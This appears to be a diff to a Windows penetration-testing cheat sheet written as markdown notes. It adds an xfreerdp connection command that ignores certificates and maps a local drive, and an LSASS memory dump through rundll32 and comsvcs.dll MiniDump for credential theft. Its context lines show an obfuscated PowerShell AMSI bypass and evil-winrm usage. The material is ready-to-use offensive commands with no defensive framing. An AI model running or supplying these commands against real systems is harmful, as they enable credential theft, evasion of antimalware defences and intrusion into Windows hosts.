@@ -21,7 +21,13 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
 ```
 -or-
 ```
+
 winrm quickconfig
+```
+
+// xfreerdp - dynamic resolution, shared folder, ignore cert  
+```
+xfreerdp /dynamic-resolution /cert:ignore /v:x.x.x.x /u:shellton /p:'spazzword' /drive:SHARE,<local file path>
 ```
 
 // evil-winrm
@@ -69,6 +75,12 @@ $w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
 $assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
 $field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
 $field.SetValue($null,$true)
+```
+
+// Dump lsass using comsvcs.dll
+```
+tasklist /fi "imagename eq lsass.exe"
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID> lsass.dmp full 
 ```
 
 // Impacket - Create share  (not MacOS)
